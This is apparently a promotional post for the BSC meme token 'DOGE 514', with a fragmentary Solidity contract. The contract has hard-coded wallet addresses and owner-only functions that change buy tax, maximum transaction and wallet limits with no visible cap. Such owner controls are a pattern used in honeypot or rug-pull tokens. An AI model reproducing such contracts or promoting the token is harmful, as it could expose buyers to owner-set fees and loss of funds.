...
DOGE 514 ($DOGE) is an innovative cryptocurrency operating on the Binance Smart Chain (BSC) network

$DOGE
🐶Fair Launch at 16.00 UTC, Today
🐶Tax 7/9%
...
contract DOGE514 is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "DOGE 514";
    string private constant _symbol = unicode"$DOGE";
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint8 private _TxCount = 0;
    uint256 private _tTotal = 97000000000 * 10**_decimals;
    ...
    address payable public DevWallet = payable(0x00d62d73F4c2013FeEB5E7C2f5966379F9fCA7c2);
    address payable public MarketingWallet = payable(0x16C49Cb588687a653E55bcD7D91F74ACF80C2829);
    ...
    function getnewFees(uint256 buytax, uint256 selltax) external onlyAddress {
        _tax_On_Buy = buytax;
    ...
    function dogemaxTx() external onlyAddress {
        _maxTxAmount = _maxWalletToken;
    }
    function dogemaxWallet(uint256 newmaxWallet) external onlyAddress {
